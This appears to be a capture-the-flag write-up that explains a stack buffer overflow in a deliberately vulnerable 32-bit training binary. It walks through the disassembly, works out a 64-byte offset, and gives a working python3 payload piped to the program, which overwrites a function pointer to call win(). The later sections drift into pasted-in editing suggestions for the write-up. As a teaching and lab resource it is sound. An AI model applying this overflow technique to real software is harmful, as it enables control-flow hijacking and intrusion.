# ex03 – Stack Buffer Overflow (Overwriting a Function Pointer)

## Objective

The goal of this challenge is to redirect the program's execution flow to an uncalled function (`win`) and display the following message:

```text
code flow successfully changed

```

This challenge advances the concept of a **stack buffer overflow**. Instead of just changing a variable's value to pass a simple check, we are overwriting a **local function pointer** to hijack the control flow and execute arbitrary functions within the binary.

---

## Initial Analysis

Before diving into the assembly, I gathered information using basic analysis tools.

### Identify the Binary

```bash
file bin

```

Result:

* 32-bit ELF executable (Intel i386)
* Dynamically linked
* Not stripped

Because the binary is not stripped, we can easily see the function names, making it straightforward to identify our target function.

---

### Security Protections

```bash
checksec --file=bin

```

Results:

* No RELRO
* No Stack Canary
* NX Disabled
* No PIE

Like previous exercises, all modern protections are disabled to allow for a straightforward stack-based buffer overflow.

---

### Extract Useful Strings

```bash
strings bin

```

Interesting output:

```text
code flow successfully changed
calling function pointer, jumping to 0x%08x
gets
puts
printf

```

The string `code flow successfully changed` tells us what our success condition looks like. The `calling function pointer...` string reveals that the program attempts to execute a function pointer after the buffer overflow occurs.

---

### Symbol Information

```bash
readelf -s bin

```

Useful symbols found:

* `main` (Address: `0x08048438`)
* `win` (Address: `0x08048424`)
* `gets` (The vulnerable function)

The presence of a function named `win` at `0x08048424` strongly suggests this is our target. We need to overwrite the function pointer so that it points to this address.

---

# Understanding the Assembly

Using GDB, we can disassemble the `main` function to understand the stack layout:

```bash
(gdb) disassemble main

```

Output analysis:

## 1. Creating the Stack Frame

```asm
0x0804843e <+6>:  sub    $0x60,%esp

```

The compiler reserves **96 bytes** (`0x60`) on the stack for local variables.

## 2. Initializing the Function Pointer

```asm
0x08048441 <+9>:  movl   $0x0,0x5c(%esp)

```

Equivalent C:

```c
void (*fp)() = 0;

```

A local variable (the function pointer) is initialized to `0` at the stack offset `ESP + 0x5c`.

## 3. Finding the Buffer and Calling gets()

```asm
0x08048449 <+17>: lea    0x1c(%esp),%eax
0x0804844d <+21>: mov    %eax,(%esp)
0x08048450 <+24>: call   0x8048330 <gets@plt>

```

Here, `lea` (Load Effective Address) computes the start of our input buffer at `ESP + 0x1c`. This address is pushed to the stack (via `mov %eax, (%esp)`) as the argument for the `gets()` function.

## 4. The Execution Check

```asm
0x08048455 <+29>: cmpl   $0x0,0x5c(%esp)
0x0804845a <+34>: je     0x8048477 <main+63>

```

The program checks if the value at `ESP + 0x5c` is still `0`. If it is (meaning no overflow happened), it jumps to the end of the program.

If it is **not 0** (meaning we successfully overwrote it), the program proceeds to print the `calling function pointer...` message and then executes:

```asm
0x08048471 <+57>: mov    0x5c(%esp),%eax
0x08048475 <+61>: call   *%eax

```

This takes whatever value is now inside `ESP + 0x5c`, loads it into the `EAX` register, and calls it.

---

# Calculating the Offset

The assembly tells us:

* `buffer` starts at `ESP + 0x1c`
* `function_pointer` is at `ESP + 0x5c`

Subtracting the two gives us the size of the buffer before we hit the target variable:

```text
  0x5c
- 0x1c
------
  0x40

```

`0x40` in decimal is **64**.

This means we need exactly 64 bytes of "junk" to fill the buffer, and the next 4 bytes will overwrite the function pointer.

---

# Exploitation

To successfully redirect execution, we need to overwrite the function pointer with the address of the `win` function.

From `readelf`, we know:
`win` Address = `0x08048424`

Because x86 architecture uses **Little-Endian** byte order, we must pass this address backwards in our payload:
`\x24\x84\x04\x08`

### The Payload Structure:

```text
[ 64 bytes of padding ('A') ] + [ Address of win() in Little-Endian ]

```

---

# Reconstructing the Original C Code

Based on the assembly and GDB flow, the source code looks almost exactly like this:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
    puts("code flow successfully changed");
}

int main(int argc, char **argv)
{
    volatile void (*fp)();
    char buffer[64];

    fp = 0;

    gets(buffer);

    if(fp != 0) {
        printf("calling function pointer, jumping to 0x%08x\n", fp);
        fp();
    }
}



# How to solve it

From your analysis:

```
buffer -> ESP + 0x1c

fp     -> ESP + 0x5c
```

Calculate the offset:

```
0x5c
-0x1c
------
0x40 = 64 bytes
```

So after **64 bytes**, you start writing over `fp`.

---

## Step 1. Find the address of `win`

You already did:

```bash
readelf -s bin
```

Result:

```
win = 0x08048424
```

You can also verify in GDB:

```bash
gdb ./bin
(gdb) info functions
```

or

```bash
(gdb) p win
```

---

## Step 2. Convert to little endian

The address is

```
0x08048424
```

Split into bytes:

```
08 04 84 24
```

Little endian stores the least significant byte first:

```
24 84 04 08
```

So the bytes become

```text
\x24\x84\x04\x08
```

---

## Step 3. Build the payload

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
\x24\x84\x04\x08
```

or

```
+------------------------+----------------+
|      64 bytes          |   fp address   |
|AAAAAAAAAAAAAAAAAAAA....| 0x08048424     |
+------------------------+----------------+
```

Python:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64+b"\x24\x84\x04\x08")'
```

---

## Step 4. Execute

Since this binary uses `gets()` (not `argv`), pipe the payload to stdin:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64+b"\x24\x84\x04\x08")' | ./bin
```

Expected output:

```text
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

---

# Why it works

Initially

```
fp = 0
```

Memory looks like

```
Higher addresses
+---------------------+
| fp = 0              |
+---------------------+
| buffer[64]          |
+---------------------+
```

After the overflow

```
Higher addresses
+---------------------+
| fp = 0x08048424     |
+---------------------+
| AAAAAAAAAAAAAAAA... |
+---------------------+
```

Then the assembly executes

```asm
mov 0x5c(%esp), %eax
call *%eax
```

which becomes

```
EAX = 0x08048424

call *eax
```

Graphically:

```
Memory
│
│ fp
│
▼
0x08048424
        │
        ▼
+-------------------+
| win()             |
| puts("code flow") |
+-------------------+
```

So instead of calling a normal function chosen by the program, **you decide which function gets called**.

---



### 1. Add a stack diagram

This challenge is all about understanding the memory layout.

```
Higher Addresses
─────────────────────────────

Return Address
─────────────────────────────
Saved EBP
─────────────────────────────
fp (4 bytes)
ESP + 0x5c
─────────────────────────────
buffer[64]
ESP + 0x1c
─────────────────────────────
ESP

Lower Addresses
```

This immediately shows **why 64 bytes reach the function pointer**.

---

### 2. Add an execution-flow diagram

Something like:

```text
Program starts
│
▼
fp = NULL
│
▼
gets(buffer)
│
▼
Overflow?
│
├── No
│      │
│      ▼
│ fp == NULL
│
└── Yes
       │
       ▼
Overwrite fp
       │
       ▼
fp != NULL
       │
       ▼
call *fp
       │
       ▼
win()
       │
       ▼
Success!
```

---

### 3. Explain indirect calls

This is the **new concept** introduced in ex03.

I would explain the difference:

```asm
call 0x08048424
```

↓

```
Jump to a fixed address.
```

versus

```asm
call *%eax
```

↓

```
Read the address stored in EAX,
then jump there.
```

Example:

```
EAX = 0x08048424

call *eax

↓

Jump to win()
```

This is the key idea of the challenge.

---

### 4. Explain what a function pointer is

A beginner-friendly section like this would fit nicely:

```c
void hello()
{
    puts("Hello");
}

void (*fp)();

fp = hello;

fp();          // Calls hello()
```

Think of a function pointer as:

```
Normal variable

score = 10

stores
↓

10
```

```
Function pointer

fp = win

stores
↓

0x08048424
```

Instead of storing a number, it stores the **address of executable code**.
---

## Lessons Learned

* **Function Pointers are High-Value Targets:** Overwriting a local variable can change logic, but overwriting a function pointer immediately grants control over the Instruction Pointer (`EIP`).
* **Little-Endian Formatting:** When injecting raw memory addresses into x86 binaries, the bytes must be reversed. `0x08048424` becomes `\x24\x84\x04\x08`.
* **`call *%eax` mechanics:** The program literally jumps to whatever address is held in the register. If you control the memory that gets loaded into the register, you control the program.